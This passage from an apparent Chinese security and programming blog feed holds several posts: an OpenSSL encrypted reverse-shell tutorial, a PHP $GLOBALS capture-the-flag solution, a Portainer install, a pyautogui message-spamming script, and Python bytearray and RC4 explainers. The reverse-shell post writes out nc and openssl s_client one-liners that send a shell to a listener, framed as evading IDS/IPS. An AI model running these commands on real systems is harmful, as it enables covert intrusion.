      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenSSL反弹加密Shell</title>
    <url>/post/4904f19c.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在进行红队渗透测试的后渗透阶段为了进一步横行渗透往往需要反弹 shell，这里列出了使用各种语言进行反弹 shell 的方法，我发现这种反弹 shell 方式都有一个缺点，那就是<strong>所有的流量都是明文传输的</strong>。</p>
<p>我们使用 nc 反弹 shell 进行测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kali: nc -lvp 4444</span><br><span class="line">Win7: nc 192.168.1.6 4444 -e cmd</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652237967160-45dd4930-75d5-4813-a5ff-f64c3fd77399.png" alt="img"></p>
<p>使用 wireshark 可以直接看到我们执行的命令和返回信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652238104049-608cdc11-7782-4e48-918c-a2a7481a6d61.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652238147708-c2f754e1-30c3-4904-82df-5389be578e06.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652238272378-d16f8b90-f107-45d4-9a23-6ddec2444522.png" alt="img"></p>
<p>在这种情况下当我们进行操作时，网络防御检测系统(IDS、IPS等)会获取到我们的通信内容并进行告警和阻止，因此需要对通信内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密 shell。</p>
<h1 id="二、OpenSSL简介"><a href="#二、OpenSSL简介" class="headerlink" title="二、OpenSSL简介"></a>二、OpenSSL简介</h1><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份</p>
<p>利用 OpenSSL 反弹 shell 之前需要生成自签名证书</p>
<h1 id="三、使用OpenSSL生成自签名证书"><a href="#三、使用OpenSSL生成自签名证书" class="headerlink" title="三、使用OpenSSL生成自签名证书"></a>三、使用OpenSSL生成自签名证书</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>

<p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652238677762-eb5d67b3-f597-4a9c-b503-9900029d25c9.png" alt="img"></p>
<h1 id="四、使用OpenSSL反弹加密shell"><a href="#四、使用OpenSSL反弹加密shell" class="headerlink" title="四、使用OpenSSL反弹加密shell"></a>四、使用OpenSSL反弹加密shell</h1><h3 id="（1）Linux"><a href="#（1）Linux" class="headerlink" title="（1）Linux"></a>（1）Linux</h3><p>假设我们从 A 主机反弹 shell 到 B 主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------------------                  ----------------------</span><br><span class="line">| A:192.168.1.8  |  --- shell ---&gt; | B:192.168.1.6:4444  |</span><br><span class="line">------------------                  ----------------------</span><br></pre></td></tr></table></figure>

<p>首先需用利用上一步生成的自签名证书，在 B 主机上使用 OpenSSL 监听一个端口，在这里使用 4444 端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</span><br></pre></td></tr></table></figure>

<p>此时 OpenSSL 在 4444 端口上启动了一个 SSL/TLS server</p>
<p>这时在 A 主机进行反弹 shell 操作，命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.1.6:4444 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>

<p>这样就使用 OpenSSL 反弹了一个加密的 shell</p>
<p>效果如下：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652239624818-9ab1560a-0e0b-4401-bdae-3901aa8c5811.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652239645485-0fe230f4-36c0-44c9-93b0-0aa46b13ec32.png" alt="img"></p>
<p>使用 wireshark 抓包可以看到，A 和 B 主机之间在使用 TLS1.2 协议进行加密通信</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652239720295-161ee961-ee3a-4958-ad57-f62851988c73.png" alt="img"></p>
<h3 id="（2）Windows"><a href="#（2）Windows" class="headerlink" title="（2）Windows"></a>（2）Windows</h3><p>在 Windows 系统上反弹加密 shell 的方式有点不一样</p>
<p>具体命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2]</span><br></pre></td></tr></table></figure>

<p>以上命令会从 [ip]:[port1] 获取命令发送给 cmd.exe执行，然后把结果返回到 [ip]:[port2]</p>
<p>因此在本机需要启动两个 s_server</p>
<p>从 port1 发送命令到 cmd</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_server -quiet -key [keyfile] -cert [cert] -port [port1] </span><br></pre></td></tr></table></figure>

<p>从 port2 获取发送给 port1 的命令执行结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_server -quiet -key [keyfile] -cert [cert] -port [port2]</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652241836890-5c230c35-26b8-4779-b5a5-e78b7ddd7134.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652241888582-9e2d14f8-1b0a-4f22-a56a-3fda2cc115d2.png" alt="img"></p>
<h1 id="五、使用-OpenSSL-搭建简易-HTTPS-Server"><a href="#五、使用-OpenSSL-搭建简易-HTTPS-Server" class="headerlink" title="五、使用 OpenSSL 搭建简易 HTTPS Server"></a>五、使用 OpenSSL 搭建简易 HTTPS Server</h1><p>使用以下命令前需要使用 OpenSSL 生成证书自签名证书，命令在上文中已给出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_server -key key.pem -cert cert.pem -accept 44330 -WWW</span><br></pre></td></tr></table></figure>

<p>以上命令在 44330 端口启动了一个 HTTPS Server</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652258694562-31243482-54ef-42f5-89ed-6084aa50d9dc.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1652258673912-411b5b9e-309e-4068-a01d-4fa942b100de.png" alt="img"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>OpenSSL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP的$GLOBALS数组</title>
    <url>/post/b7832a6b.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>$GLOBALS —— 引用全局作用域中可用的全部变量</strong>。</p>
<p><strong>说明：</strong>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<p><strong>示例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&quot;foo&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in current scope: &#x27;</span> . <span class="variable">$foo</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;Example content&quot;</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="variable">$foo</span> in <span class="keyword">global</span> scope: Example content</span><br><span class="line"><span class="variable">$foo</span> in current scope: local variable</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<ul>
<li>“Superglobal”也称为自动化的全局变量。这就表示其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 <strong>global $variable;</strong> 来访问它。  </li>
<li><strong>变量可用性</strong>。与所有其他超全局变量不同，<code>$GLOBALS</code>在PHP中总是可用的。</li>
</ul>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><ul>
<li>页面如下</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632486229240-188bcecb-d4f2-47c2-9b87-a8f58a715bfe.png" alt="img"></p>
<p>其中正则表达式/^\w+$/，意思是只能有字母和数字</p>
<ul>
<li><p>两个//表示开始和结束</p>
</li>
<li><p>^表示开始字符串</p>
</li>
<li><p>$表示结束字符串</p>
</li>
<li><p>\w表示包含【a-z，A-Z, _ , 0-9】</p>
</li>
<li><p>+表示一个或者多个\w</p>
</li>
<li><p>后面的i表示不区分大小写，在此处没用，因为\w里已经包含了大小写。 </p>
</li>
</ul>
<p>访问 <a href="http://114.67.246.176:12610/?args=GLOBALS%EF%BC%8C%E7%9C%8B%E5%88%B0flag">http://114.67.246.176:12610/?args=GLOBALS，看到flag</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632487926975-c718606e-dab0-4418-9dbf-6e84e2a664a9.png" alt="img"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Portainer可视化面板安装</title>
    <url>/post/2f19e9de.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
<li>Rancher（CI/CD再用）</li>
<li>Portainer（先用这个）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=<span class="literal">true</span> portainer/portainer</span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span></span><br><span class="line">d93e31b351d5e51dd006ab068e99507ce92185b4b6c8cc5aea6babb0e81b716f</span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">d93e31b351d5   portainer/portainer   <span class="string">&quot;/portainer&quot;</span>             7 seconds ago    Up 6 seconds    0.0.0.0:8088-&gt;9000/tcp, :::8088-&gt;9000/tcp   romantic_kepler</span><br><span class="line">64dc6975f6e4   tomcat                <span class="string">&quot;catalina.sh run&quot;</span>        52 minutes ago   Up 52 minutes   0.0.0.0:3355-&gt;8080/tcp, :::3355-&gt;8080/tcp   tomcat01</span><br><span class="line">d0850b4943fc   nginx                 <span class="string">&quot;/docker-entrypoint.…&quot;</span>   15 hours ago     Up 15 hours     0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp       nginx01</span><br></pre></td></tr></table></figure>

<ul>
<li>访问8088端口，创建账户</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630377161089-47981bdf-e843-484f-b720-d3018a2d3316.png" alt="img"></p>
<ul>
<li>我们选择local即可</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630377199498-38faf222-9012-451e-a278-f8e1cc27b6b6.png" alt="img"></p>
<ul>
<li>可以管理docker</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630377258717-90318ccf-2614-450f-b079-782009f9d794.png" alt="img"></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现消息轰炸机</title>
    <url>/post/5ab8ed9d.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;解放双手，让电脑来帮我们自动发一些我们想要发的消息，挺省力的，比如说我们想恶搞好朋友，那么我们就可以用脚本来实现自动复制、粘贴和发送文字的功能，从而解放我们自己，不用亲自在电脑上反复干这个<code>Ctrl C</code>/<code>Ctrl V</code>这个累活儿。</p>
<p>&emsp;&emsp;还可以把定时多长时间后发送指定内容，这下子就不用坐在电脑前面到点了发弹幕了。</p>
<h1 id="第一步：获取聊天窗口位置"><a href="#第一步：获取聊天窗口位置" class="headerlink" title="第一步：获取聊天窗口位置"></a>第一步：获取聊天窗口位置</h1><p>&emsp;&emsp;在我们发消息之前，得需要知道聊天窗口的位置在哪，即鼠标停留在哪里才能定位到聊天窗口的输入界面，也就是鼠标的x和y坐标是多少。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Press Ctrl-C to stop&quot;</span>)</span><br><span class="line">        x, y = pag.position()</span><br><span class="line">        positionStr = <span class="string">&quot;(&quot;</span> + <span class="built_in">str</span>(x).rjust(<span class="number">4</span>) + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(y).rjust(<span class="number">4</span>) + <span class="string">&quot;)&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(positionStr)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end...&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;只要程序运行起来之后，每当我们移动鼠标，鼠标的x和y值就会自动发生改变并打印出来，我们只需要把聊天窗口调出来，把鼠标定位到聊天的窗口的输入位置就能获取到此时的x和y值。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636813473499-546b1119-f7ab-4dbf-b424-ec28c2ec1ec3.png" alt="img"></p>
<h1 id="第二步：实现自动发送消息"><a href="#第二步：实现自动发送消息" class="headerlink" title="第二步：实现自动发送消息"></a>第二步：实现自动发送消息</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"><span class="keyword">import</span> pyperclip</span><br><span class="line">content = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">我爱你</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">list</span>(content.split(<span class="string">&quot;\n&quot;</span>))*<span class="number">10</span>:<span class="comment">#发送10次文本</span></span><br><span class="line">    <span class="keyword">if</span> line:</span><br><span class="line">        pyautogui.click(<span class="number">801</span>, <span class="number">730</span>)  <span class="comment">#鼠标点击并定位到聊天窗口</span></span><br><span class="line">        pyperclip.copy(line)    <span class="comment">#复制该行</span></span><br><span class="line">        pyautogui.hotkey(<span class="string">&quot;ctrl&quot;</span>,<span class="string">&quot;v&quot;</span>) <span class="comment">#粘贴，mac电脑则把ctrl换成command</span></span><br><span class="line">        pyautogui.typewrite(<span class="string">&quot;\n&quot;</span>)   <span class="comment">#发送</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>) <span class="comment">#每次发完间隔0.1s</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;先运行第一步的代码确定坐标，然后运行第二步实施自动发送</p>
<h1 id="改良版"><a href="#改良版" class="headerlink" title="改良版"></a>改良版</h1><p>Github：<a href="https://github.com/LeeJony000/Message_bomber">https://github.com/LeeJony000/Message_bomber</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636819405073-fdf5f514-6c63-4317-a440-257c90f222be.png" alt="img"></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Python的bytearray和bytes</title>
    <url>/post/5bd337c9.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、bytearray函数简介"><a href="#一、bytearray函数简介" class="headerlink" title="一、bytearray函数简介"></a>一、bytearray函数简介</h1><p><strong>【描述】</strong></p>
<p><strong>bytearray()</strong> 方法返回一个新字节数组。这个数组里的元素是可变的，并且每个元素的值范围: 0 &lt;= x &lt; 256。</p>
<p><strong>【语法】</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bytearray</span>(<span class="params">[source[, encoding[, errors]]]</span>)</span></span><br></pre></td></tr></table></figure>

<p><strong>【参数】</strong></p>
<ul>
<li>如果 source 为整数，则返回一个长度为 source 的初始化数组；</li>
<li>如果 source 为字符串，则按照指定的 encoding 将字符串转换为字节序列；</li>
<li>如果 source 为可迭代类型，则元素必须为[0 ,255] 中的整数；（刚好是28，一个字节就是8比特）</li>
<li>如果 source 为与 buffer 接口一致的对象，则此对象也可以被用于初始化 bytearray。</li>
<li>如果没有输入任何参数，默认就是初始化数组为0个元素。</li>
</ul>
<p><strong>【返回值】</strong></p>
<p>返回新字节数组，可变字节序列 bytearray 有一个明显的特征，输出的时候最前面会有一个字符 b 标识。</p>
<h1 id="二、实例"><a href="#二、实例" class="headerlink" title="二、实例"></a>二、实例</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">bytearray</span>()  <span class="comment"># 定义空的字节序列bytearray</span></span><br><span class="line">b = <span class="built_in">bytearray</span>(<span class="number">3</span>)   <span class="comment"># 定义指定个数的字节序列bytes，默认以0填充，不能是浮点数</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">bytearray</span>(<span class="string">&quot;w01ke&quot;</span>, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">bytearray</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])  <span class="comment"># 可迭代类型</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    e = <span class="built_in">bytearray</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">256</span>])  <span class="comment"># 报错</span></span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f)</span><br></pre></td></tr></table></figure>

<p>​    输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytearray(b&#x27;&#x27;)</span><br><span class="line">bytearray(b&#x27;\x00\x00\x00&#x27;)</span><br><span class="line">bytearray(b&#x27;w01ke&#x27;)</span><br><span class="line">bytearray(b&#x27;\x01\x02\x03&#x27;)</span><br><span class="line">byte must be in range(0, 256)</span><br></pre></td></tr></table></figure>

<p>​    接下来来探究字节序列具体的每个字节的值是多少</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="built_in">bytearray</span>(<span class="number">3</span>)   <span class="comment"># 定义指定个数的字节序列bytes，默认以0填充，不能是浮点数</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">bytearray</span>(<span class="string">&quot;w01ke&quot;</span>, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">bytearray</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])  <span class="comment"># 可迭代类型</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    <span class="built_in">print</span>(b[i])</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="built_in">print</span>(c[i])</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(d)):</span><br><span class="line">    <span class="built_in">print</span>(d[i])</span><br></pre></td></tr></table></figure>

<p>​    结果如下所示，可以看到每个字节的值就是对应的ASCII码（十进制）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bytearray</span>(<span class="string">b&#x27;\x00\x00\x00&#x27;</span>)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="built_in">bytearray</span>(<span class="string">b&#x27;w01ke&#x27;</span>)</span><br><span class="line"><span class="number">119</span></span><br><span class="line"><span class="number">48</span></span><br><span class="line"><span class="number">49</span></span><br><span class="line"><span class="number">107</span></span><br><span class="line"><span class="number">101</span></span><br><span class="line"><span class="built_in">bytearray</span>(<span class="string">b&#x27;\x01\x02\x03&#x27;</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<h1 id="三、与bytes函数的区别"><a href="#三、与bytes函数的区别" class="headerlink" title="三、与bytes函数的区别"></a>三、与bytes函数的区别</h1><p>其他都一样。不同的是bytes为不可变字节序列，可以看作是由一个个byte（二进制0-255数值）组成的str序列。bytearray为可变字节序列，可以看作是一组二进制数值的（0-255）的list序列。举例如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">b&#x27;w01ke&#x27;</span>  <span class="comment"># bytes类型，不可变字节序列</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">a[<span class="number">0</span>] = <span class="string">&quot;A&quot;</span>  <span class="comment"># 会报错</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">&lt;class &#x27;bytes&#x27;&gt;</span></span><br><span class="line"><span class="string">119 48 49 107 101 Traceback (most recent call last):</span></span><br><span class="line"><span class="string">File &quot;C:\\Users\\86147\\Desktop\\demo.py&quot;, line 6, in &lt;module&gt;</span></span><br><span class="line"><span class="string">a[0] = &quot;A&quot;</span></span><br><span class="line"><span class="string">TypeError: &#x27;bytes&#x27; object does not support item assignment</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​    如果换成bytearray类型即可修改内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">b&#x27;w01ke&#x27;</span>  <span class="comment"># bytes类型，不可变字节序列</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line">a = <span class="built_in">bytearray</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">a[<span class="number">0</span>] = <span class="number">65</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">D:\\Python3.7.9\\python.exe C:\\Users\\86147\\Desktop\\demo.py </span></span><br><span class="line"><span class="string">&lt;class &#x27;bytes&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;class &#x27;bytearray&#x27;&gt;</span></span><br><span class="line"><span class="string">119 48 49 107 101 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bytearray(b&#x27;A01ke&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>RC4加密算法</title>
    <url>/post/9dd1bdb.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;RC4加密算法是一种对称加密算法</p>
<h1 id="一、对称加密算法"><a href="#一、对称加密算法" class="headerlink" title="一、对称加密算法"></a>一、对称加密算法</h1><p>&emsp;&emsp;对称加密(也叫私钥加密)指加密和解密使用相同<a href="http://baike.baidu.com/view/934.htm">密钥</a>的加密算法。有时又叫传统密码算法，就是加密密钥能够从解密密钥中推算出来，同时解密密钥也可以从加密密钥中推算出来。而在大多数的对称算法中，加密密钥和解密密钥是相同的，所以也称这种加密算法为秘密密钥算法或单密钥算法。它要求发送方和接收方在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都可以对他们发送或接收的消息解密，所以密钥的保密性对通信的安全性至关重要。 </p>
<h1 id="二、RC4加密算法"><a href="#二、RC4加密算法" class="headerlink" title="二、RC4加密算法"></a>二、RC4加密算法</h1><h2 id="1、预备知识"><a href="#1、预备知识" class="headerlink" title="1、预备知识"></a>1、预备知识</h2><h3 id="（1）异或"><a href="#（1）异或" class="headerlink" title="（1）异或"></a>（1）异或</h3><p>&emsp;&emsp;学习RC4加密算法之前，首先要知道：<strong>对明文使用同一个密钥异或两次最后是得到原文的</strong></p>
<h3 id="（2）流密码"><a href="#（2）流密码" class="headerlink" title="（2）流密码"></a>（2）流密码</h3><h4 id="①-定义"><a href="#①-定义" class="headerlink" title="① 定义"></a>① 定义</h4><p>&emsp;&emsp;流密码是对称密码算法，从明文输入流逐位或逐字节产生密文输出。</p>
<p>&emsp;&emsp;流密码类似于“一次一密”，不同的是“一次一密”使用的是真正的随机数流，而流密码使用的是伪随机数流。</p>
<h4 id="②-实例"><a href="#②-实例" class="headerlink" title="② 实例"></a>② 实例</h4><p>&emsp;&emsp;使用最广泛的流密码是RC4</p>
<h4 id="③-流密码结构"><a href="#③-流密码结构" class="headerlink" title="③ 流密码结构"></a>③ 流密码结构</h4><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638015605787-f3c732e3-7fb2-42bf-ad9a-46141b10a8b1.png" alt="img"></p>
<h4 id="④-设计流密码的主要因素"><a href="#④-设计流密码的主要因素" class="headerlink" title="④ 设计流密码的主要因素"></a>④ 设计流密码的主要因素</h4><ol>
<li><p>加密序列的周期要长，若出现重复的周期过短，容易被破解</p>
</li>
<li><p>密钥流应该尽可能地接近真正随机数流的特征</p>
</li>
<li><p>密钥长度要长，以避免穷举攻击</p>
</li>
</ol>
<h2 id="2、RC4算法介绍"><a href="#2、RC4算法介绍" class="headerlink" title="2、RC4算法介绍"></a>2、RC4算法介绍</h2><p>&emsp;&emsp;RC4算法是Ron Rivest为RSA公司在1987年设计的一种流密码，作为RSA的商业机密直到1994年才被匿名公布于Internet。</p>
<p>&emsp;&emsp;该算法是一个可变密钥长度、面向字节操作的流密码。该算法以<strong>随机置换</strong>作为<strong>基础</strong>，其密码周期很可能大于10100，且该算法的运行速度很快。</p>
<p>&emsp;&emsp;RC4被用于为网络浏览器和服务器间通信而制定的SSL/TLS（安全套接字协议/传输层安全协议）标准中，以及作为IEEE 801.11无线局域网标准一部分的WEP(Wired Equivalent Privacy)协议和新的WiFi受保护访问协议（WPA）中。<strong>从这些应用来看，RC4构成了当今网络通信的非常重要的部分，因此这个算法非常重要。</strong></p>
